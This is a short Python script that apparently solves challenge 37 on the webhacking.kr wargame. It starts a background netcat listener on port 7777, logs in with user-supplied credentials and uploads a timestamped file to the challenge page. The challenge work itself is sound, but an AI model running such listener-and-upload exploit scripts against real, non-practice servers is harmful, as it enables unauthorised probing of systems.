import requests
import os
import time
import re

# 해당 파이썬 코드 실행환경 
# 1. 방화벽에서 해당 포트를 열어놔야 함
# 2. nc가 설치된 Linux환경


#37번 문제
url = 'https://webhacking.kr/challenge/web-18/index.php'


# 먼저 nc 포트를 열어 놔야 한다.
def login(session):
    datas = {}
    print(" ------------ login ----------------------")
    datas['id'] = input("webhacking.kr id: ")
    datas['pw'] = input("webhacking.kr pw: ")
    response = session.post("https://webhacking.kr/login.php?login",data=datas)
    if( "<script>location.href='/';</script>" in response.text):
        print("login success : ",datas['id'])
    else:
        print("login Fail")
        exit(0)


def main():
    os.system("nc -nlvp 7777 &")
    time.sleep(0.5)
    session = requests.session()
    login(session)
    file_name = 'tmp-{}'.format(int(time.time()))
    files = {
        'upfile' : (file_name,'dummy_data')
    }

    session.post(url,files=files)    
    
if __name__=='__main__':
    main()